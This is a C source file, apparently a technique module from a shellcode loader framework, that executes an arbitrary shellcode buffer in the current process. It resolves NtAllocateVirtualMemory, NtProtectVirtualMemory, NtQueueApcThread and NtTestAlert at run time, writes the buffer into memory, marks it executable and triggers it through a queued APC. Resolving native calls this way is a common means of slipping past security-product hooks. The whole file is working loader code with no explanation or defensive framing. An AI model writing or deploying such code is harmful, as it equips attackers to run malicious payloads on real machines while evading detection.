#include "../dispatch.h"
#include "../ntapi.h"

BOOL tech_nt_apc(unsigned char *sc, size_t len) {
    fnNtAllocateVirtualMemory pAlloc =
        (fnNtAllocateVirtualMemory)ntapi_resolve("NtAllocateVirtualMemory");
    fnNtProtectVirtualMemory pProtect =
        (fnNtProtectVirtualMemory)ntapi_resolve("NtProtectVirtualMemory");
    fnNtQueueApcThread pApc =
        (fnNtQueueApcThread)ntapi_resolve("NtQueueApcThread");
    fnNtTestAlert pAlert =
        (fnNtTestAlert)ntapi_resolve("NtTestAlert");
    if (!pAlloc || !pProtect || !pApc || !pAlert) return FALSE;

    PVOID base = NULL;
    SIZE_T sz = len;
    if (!NT_SUCCESS(pAlloc((HANDLE)-1, &base, 0, &sz,
                           MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE)))
        return FALSE;

    memcpy(base, sc, len);

    ULONG old = 0;
    sz = len;
    pProtect((HANDLE)-1, &base, &sz, PAGE_EXECUTE_READ, &old);

    pApc((HANDLE)-2, base, NULL, NULL, NULL);
    pAlert();
    return TRUE;
}
